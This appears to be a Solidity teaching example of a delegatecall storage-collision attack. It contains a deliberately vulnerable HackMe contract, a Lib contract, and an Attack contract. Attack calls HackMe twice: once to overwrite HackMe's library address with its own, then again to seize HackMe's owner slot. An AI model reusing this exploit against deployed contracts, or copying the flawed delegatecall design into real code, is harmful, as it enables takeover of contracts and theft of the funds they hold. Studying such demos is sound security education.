// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Lib
{
    uint public someNumber;
    function doSomething(uint _num) public
    {
        someNumber = _num;
    }
}
contract HackMe
{
    address public lib;
    address public owner;
    uint public someNumber;
    constructor (address _lib) public
    {
        lib = _lib;
        owner = msg.sender;
    }
    function doSomething(uint _num) public
    {
        lib.delegatecall(abi.encodeWithSignature("doSomething(uint256)", _num));
    }
}

contract Attack
{
    address public lib;
    address public owner;
    uint public someNumber;
    HackMe public hackMe;
    constructor(HackMe _hackMe) public
    {
        hackMe = HackMe(_hackMe);
    }
    function attack() public
    {
        hackMe.doSomething(uint(uint160(address(this))));
        hackMe.doSomething(1);
    }
    function doSomething(uint _num) public
    {
        owner = msg.sender; 
    }
} 